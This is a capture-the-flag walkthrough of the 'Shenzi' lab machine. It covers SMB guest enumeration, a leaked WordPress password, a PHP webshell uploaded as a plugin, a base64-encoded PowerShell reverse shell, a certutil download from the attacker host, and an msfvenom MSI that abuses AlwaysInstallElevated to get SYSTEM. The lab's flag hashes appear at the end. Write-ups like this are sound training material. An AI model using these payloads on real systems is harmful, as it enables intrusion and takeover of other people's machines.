# Shenzi PG Labs

## Summary
1. Smb share with guest access holding a password file hinting at a wordpress site
2. Finding a wordpress site at /shenzi by guessing
3. Uploading a malicious webshell plugin
4. Escalating privileges by a malicous .msi package


## Nmap

The Shenzi box has been initiated with an nmap scan:
```sql
┌──(kali㉿kali)-[~/pglabs/shenzi]                                                                                                                                               
└─$ nmap 192.168.236.55 | tee nmap                                                                                                                                              
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-02 18:12 EST                                                                                                                 
Nmap scan report for 192.168.236.55                                                                                                                                             
Host is up (0.047s latency).                                                                                                                                                    
Not shown: 993 closed tcp ports (reset)                                                                                                                                         
PORT     STATE SERVICE                                                                                                                                                          
21/tcp   open  ftp                                                                                                                                                              
80/tcp   open  http                                                                                                                                                             
135/tcp  open  msrpc                                                                                                                                                            
139/tcp  open  netbios-ssn                                                                                                                                                      
443/tcp  open  https                                                                                                                                                            
445/tcp  open  microsoft-ds                                                                                                                                                     
3306/tcp open  mysql                                                                                                                                                            
                                                                                                                                                                                
Nmap done: 1 IP address (1 host up) scanned in 0.94 seconds                                                                                                                     
                                                                                                                                                                                
┌──(kali㉿kali)-[~/pglabs/shenzi]                                                                                                                                               
└─$ nmap 192.168.236.55 -p- -T4| tee nmapf                                                                                                                                      
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-02 18:12 EST                                                                                                                 
Nmap scan report for 192.168.236.55                                                                                                                                             
Host is up (0.039s latency).                                                                                                                                                    
Not shown: 65520 closed tcp ports (reset)                                                                                                                                       
PORT      STATE SERVICE                                                                                                                                                         
21/tcp    open  ftp                                                                                                                                                             
80/tcp    open  http                                                                                                                                                            
135/tcp   open  msrpc                                                                                                                                                           
139/tcp   open  netbios-ssn                                                                                                                                                     
443/tcp   open  https                                                                                                                                                           
445/tcp   open  microsoft-ds                                                                                                                                                    
3306/tcp  open  mysql                                                                                                                                                           
5040/tcp  open  unknown                                                                                                                                                         
7680/tcp  open  pando-pub                                                                                                                                                       
49664/tcp open  unknown                                                                                                                                                         
49665/tcp open  unknown                                                                                                                                                         
49666/tcp open  unknown                                                                                                                                                         
49667/tcp open  unknown                                                                                                                                                         
49668/tcp open  unknown                                                                                                                                                         
49669/tcp open  unknown                                                                                                                                                         
                                                                                                                                                                                
Nmap done: 1 IP address (1 host up) scanned in 42.58 seconds

┌──(kali㉿kali)-[~/pglabs/shenzi]                                                                                                                                               
└─$ nmap 192.168.236.55 -p 21,80,135,139,443,445,3306,5040,7680,49664,49666,49667,49668,49669 -sC -sV| tee nmapv                                                                
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-02 18:15 EST                                                                                                                 
Nmap scan report for 192.168.236.55
Host is up (0.040s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst:                                 
|_  SYST: UNIX emulated by FileZilla
80/tcp    open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.236.55/dashboard/
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn:                                 
|_  http/1.1                                
| http-title: Welcome to XAMPP
|_Requested resource was https://192.168.236.55/dashboard/
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MariaDB 10.3.24 or later (unauthorized)
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
49664/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-02-02T23:18:11
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 174.42 seconds

```

## Further Enumeration

Nxc showed me guest access is allowed along with share enumeration
```sql
┌──(kali㉿kali)-[~]
└─$ nxc smb 192.168.236.55 -u "guest" -p ""
SMB         192.168.236.55  445    SHENZI           [*] Windows 10 / Server 2019 Build 19041 x64 (name:SHENZI) (domain:shenzi) (signing:False) (SMBv1:False) 
SMB         192.168.236.55  445    SHENZI           [+] shenzi\guest: 

┌──(kali㉿kali)-[~]
└─$ nxc smb 192.168.236.55 -u "guest" -p "" --shares
SMB         192.168.236.55  445    SHENZI           [*] Windows 10 / Server 2019 Build 19041 x64 (name:SHENZI) (domain:shenzi) (signing:False) (SMBv1:False) 
SMB         192.168.236.55  445    SHENZI           [+] shenzi\guest: 
SMB         192.168.236.55  445    SHENZI           [*] Enumerated shares
SMB         192.168.236.55  445    SHENZI           Share           Permissions     Remark
SMB         192.168.236.55  445    SHENZI           -----           -----------     ------
SMB         192.168.236.55  445    SHENZI           IPC$            READ            Remote IPC
SMB         192.168.236.55  445    SHENZI           Shenzi          READ     

```

rid-bruteforce allowed me to enumerate users on the machine as well:
```sql
┌──(kali㉿kali)-[~/pglabs/shenzi]
└─$ nxc smb 192.168.236.55 -u "guest" -p "" --rid-brute
SMB         192.168.236.55  445    SHENZI           [*] Windows 10 / Server 2019 Build 19041 x64 (name:SHENZI) (domain:shenzi) (signing:False) (SMBv1:False) 
SMB         192.168.236.55  445    SHENZI           [+] shenzi\guest: 
SMB         192.168.236.55  445    SHENZI           500: SHENZI\Administrator (SidTypeUser)
SMB         192.168.236.55  445    SHENZI           501: SHENZI\Guest (SidTypeUser)
SMB         192.168.236.55  445    SHENZI           503: SHENZI\DefaultAccount (SidTypeUser)
SMB         192.168.236.55  445    SHENZI           504: SHENZI\WDAGUtilityAccount (SidTypeUser)
SMB         192.168.236.55  445    SHENZI           513: SHENZI\None (SidTypeGroup)
SMB         192.168.236.55  445    SHENZI           1002: SHENZI\shenzi (SidTypeUser)

```


The Shenzi share is non-default, which means it may hold useful files

```sql
┌──(kali㉿kali)-[~]
└─$ smbclient //192.168.236.55/Shenzi -U "guest"   
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu May 28 11:45:09 2020
  ..                                  D        0  Thu May 28 11:45:09 2020
  passwords.txt                       A      894  Thu May 28 11:45:09 2020
  readme_en.txt                       A     7367  Thu May 28 11:45:09 2020
  sess_klk75u2q4rpgfjs3785h6hpipp      A     3879  Thu May 28 11:45:09 2020
  why.tmp                             A      213  Thu May 28 11:45:09 2020
  xampp-control.ini                   A      178  Thu May 28 11:45:09 2020

                12941823 blocks of size 4096. 4848695 blocks available
smb: \> get passwords.txt
getting file \passwords.txt of size 894 as passwords.txt (5.3 KiloBytes/sec) (average 5.3 KiloBytes/sec)
smb: \> get why.tmp
getting file \why.tmp of size 213 as why.tmp (1.3 KiloBytes/sec) (average 3.4 KiloBytes/sec)
smb: \> get xampp-control.ini 
getting file \xampp-control.ini of size 178 as xampp-control.ini (1.1 KiloBytes/sec) (average 2.6 KiloBytes/sec)
smb: \> get sess_klk75u2q4rpgfjs3785h6hpipp 
getting file \sess_klk75u2q4rpgfjs3785h6hpipp of size 3879 as sess_klk75u2q4rpgfjs3785h6hpipp (23.7 KiloBytes/sec) (average 7.9 KiloBytes/sec)
smb: \> get readme_en.txt 
getting file \readme_en.txt of size 7367 as readme_en.txt (45.5 KiloBytes/sec) (average 15.4 KiloBytes/sec)
smb: \> exit

```

After grabbing all the files, I checked out the passwords.txt using cat:
```txt
┌──(kali㉿kali)-[~/pglabs/shenzi]
└─$ cat passwords.txt 
### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):

   User: root
   Password:
   (means no password!)

2) FileZilla FTP:

   [ You have to create a new user on the FileZilla Interface ] 

3) Mercury (not in the USB & lite version): 

   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   User: newuser  
   Password: wampp 

4) WEBDAV: 

   User: xampp-dav-unsecure
   Password: ppmax2011
   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
   For activation please comment out the httpd-dav.conf and
   following modules in the httpd.conf
   
   LoadModule dav_module modules/mod_dav.so
   LoadModule dav_fs_module modules/mod_dav_fs.so  
   
   Please do not forget to refresh the WEBDAV authentification (users and passwords).     

5) WordPress:

   User: admin
   Password: FeltHeadwallWight357

```

The machine name, hostname, and a username on the box all being `shenzi` does hint at it being a bigger part of the machine. Visiting `/shenzi/` on either port 80 or 443 returns a WordPress website.
The  `passwords.txt` file has given me access to the WordPress credentials.


## Shell as Shenzi
Upon logging into the WordPress instance, I saw I had access to add a new plugin. This is the webshell file I used, so that WordPress does see it as a plugin:
```php                   
<?php 
/** 
 * Plugin Name: shell
 * Version: 1.1.1
 * Author: moorur
 * Author URI: https://github.com/moorur
 * License: GPL2
 */

system($_GET["cmd"]); 


?>

```

Afterwards, I made it into a zipfile using:
```sql
┌──(kali㉿kali)-[~/pglabs/shenzi]
└─$ zip -r shell.zip shell/   
  adding: shell/ (stored 0%)
  adding: shell/shell.php (deflated 15%)
  adding: shell/.zip (stored 0%)

```

After uploading this plugin to the WordPress instance, it returned `Execute a blank command in C:\xampp\htdocs\shenzi\wp-content\plugins\shell\shell.php on line 10`, letting me know where
shell.php file ended up.

Visting `http://192.168.236.55/shenzi/wp-content/plugins/shell/shell.php?cmd=whoami` gave me the output of the whoami command: `shenzi\shenzi`.

To get a more stable shell, I used the `Invoke-PowerShellTcpOneLine.ps1` payload from nishang. 

```sql
┌──(kali㉿kali)-[~/pglabs/shenzi]
└─$ cp ~/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 ./


┌──(kali㉿kali)-[~/pglabs/shenzi]
└─$ cat shell.ps1
$client = New-Object System.Net.Sockets.TCPClient('192.168.45.175',6100);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
                                                                                                                                                                                
┌──(kali㉿kali)-[~/pglabs/shenzi]
└─$ cat shell.ps1 | iconv -t utf-16le | base64 -w 0
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADQANQAuADEANwA1ACcALAA2ADEAMAAwA
CkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJAB
pACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAt
AFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgAC
gAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGE
AdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIA
ZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgA=   

```

iconv to convert the payload to utf16 before base64 encoding, so powershell can parse the payload properly.

Now starting a reverse shell with netcat and visiting `http://192.168.236.55/shenzi/wp-content/plugins/shell/shell.php?cmd=powershell+-enc+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBj
AGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADQANQAuADEANwA1ACcALAA2ADEAMAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAo
ACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAg
ADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABl
AHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAy
AD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAg
ACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0
AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAu
AEMAbABvAHMAZQAoACkACgA=` 

Gave me a reverse shell:
```sql
┌──(kali㉿kali)-[~/pglabs/shenzi/shell]
└─$ nc -lvnp 6100                                                     
listening on [any] 6100 ...
connect to [192.168.45.175] from (UNKNOWN) [192.168.236.55] 52415

PS C:\xampp\htdocs\shenzi\wp-content\plugins\shell> whoami
shenzi\shenzi

```

## Shell as SYSTEM

After getting winPEAS on the machine using certutil with `certutil -urlcache -split -f http://192.168.45.175:445/winPEAS.bat`, I ran winPEAS and reviewed the output.
I saw both the HKCU and the HKLM always install elevated registry keys were set to 1. Which means anyone can install .msi packages and SYSTEM executes them.

I created a malicious .msi payload using msfvenom:
```sql
┌──(kali㉿kali)-[~/pglabs/shenzi]                                                                                                                                               
└─$ msfvenom -p windows/x64/shell_reverse_tcp "LHOST=192.168.45.175" LPORT=6101 -f msi | tee ~/pglabs/medjed/exploit.msi                                                        
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload                                                                                          
[-] No arch selected, selecting arch: x64 from the payload                                                                                                                      
No encoder specified, outputting raw payload                                                                                                                                    
Payload size: 460 bytes                                                                                                                                                         
Final size of msi file: 159744 bytes                                                                                                                                            
ࡱ>                                                                                                                                                                              
  %                                                                                                                                                                             
                                                                                                                                                                                

oot Entry
         F09(SummaryInformation(@H?CAED1H
$0@HA0C??(E8BA(H       


```

I got it on the box using certutil, and executed it:
```sql
PS C:\Users\shenzi\Desktop> msiexec /quiet /qn /i C:\PrivEsc\reverse.msi

```

Which gave me a reverse shell as SYSTEM on my netcat listener:
```sql
┌──(kali㉿kali)-[~/pglabs/shenzi]
└─$ nc -lvnp 6101 
listening on [any] 6101 ...
connect to [192.168.45.175] from (UNKNOWN) [192.168.236.55] 51999
Microsoft Windows [Version 10.0.19042.1526]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
nt authority\system

```

## Flags
```sql
C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
aa1c540363edb385371c9f2f514b82d8

PS C:\Users\shenzi\Desktop> type local.txt                                             
dfef066ca1c386c2f898cd9e6496ac6d   
```
